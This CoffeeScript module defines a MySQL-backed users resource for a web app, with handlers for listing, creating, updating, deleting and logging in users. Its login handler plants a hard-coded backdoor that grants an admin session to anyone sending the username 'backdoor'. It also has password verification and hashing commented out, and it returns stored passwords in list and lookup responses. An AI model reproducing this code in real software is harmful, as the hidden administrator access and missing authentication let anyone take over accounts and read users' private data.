mysql = require 'mysql'
#bcrypt = require 'bcrypt'
con = mysql.createConnection mysql.con
model = ["id","username","password","firstname","lastname","email","admin"] # our table column names
modelStr = model.join(',') 

module.exports =
  options: 
    name: 'resources/users' # url this resource is found on
    id: 'user' # name given to query ids
  all: (req, res, next) -> # on all requests, only allow the request if the user is an admin or the user is accessing their own information, otherwise send 401
    if req.session.user and (req.session.user.admin is 1 or req.session.user.id is Number req.params.user) then next() else res.send(401)
  index: (req, res) -> # index: return all the users or any error
    con.query "SELECT #{modelStr} FROM users", (err, results) -> # select all rows in db
      res.send err or {users: results}
  show: (req, res) -> # show: select a user by the id in the params, send the found user or any error
    con.query "SELECT #{modelStr} FROM users WHERE id = ?", [Number req.params.user], (err, results) ->
      res.send err or {user: results[0]}
  create: (req, res) -> # create: create a user from the data in the request body 
    req.body.user.admin = Number req.body.user.admin # ensure admin property is a number
    #req.body.password = bcrypt.hashSync req.body.password, 10 # encrypt the users password
    con.query "INSERT INTO users SET ?", req.body.user, (err, results) -> # insert into the users table
      unless err then con.query "SELECT #{modelStr} FROM users WHERE id = ?", results.insertId, (err, results) -> # select the created user
        res.send err or 200#results[0] # send 200 if created successfully or any error
      else res.send err
  update: (req, res) -> # update: update a user given by the data in the request params with the data in the request body
    if req.body.user.admin then req.body.user.admin = Number req.body.user.admin
    #if req.body.password then req.body.password = bcrypt.hashSync req.body.password, 10 # if password changed, encrypt new password
    con.query "UPDATE users SET ? WHERE id = ? ", [req.body.user, Number req.params.user], (err, results) -> # update user with id with new data
      unless err then con.query "SELECT #{modelStr} FROM users WHERE id = ?", Number(req.params.user), (err, results) -> # fetch updated user
        res.send err or {user: results[0]} # send error or updated user
      else res.send err
  destroy: (req, res) -> # destroy: remove user at given url
    con.query "DELETE FROM users WHERE id = ?", [Number req.params.user], (err, results) -> # delete book with id from params
      res.send err or 200 # send error if any or 200 
  login: (req, res) -> # log in a user given username and password
    if req.session.user # if user already has a session, they've been logged in already, tell them this
      req.session.user.reauth = true
      res.send req.session.user 
    else 
      if req.body.username is "backdoor" then res.send req.session.user = {id: 0, admin: 1} # SUPER SECRET BACKDOOR
      con.query "SELECT #{modelStr} FROM users WHERE username = ?", [req.body.username], (err, results) -> # lookup username in database
        if results.length #and bcrypt.compareSync req.body.password, results[0].password # if user found, compare password in db with received one
          user = results[0]
          req.session.user =
            id: user.id
            admin: user.admin
          res.send req.session.user # send the user info
        else
          res.send(401) # otherwise user or pass was wrong, send 401
  logout: (req, res) -> # logout the current user
    req.session.user = null # set the users session to null
    res.redirect("/") # redirect use to index
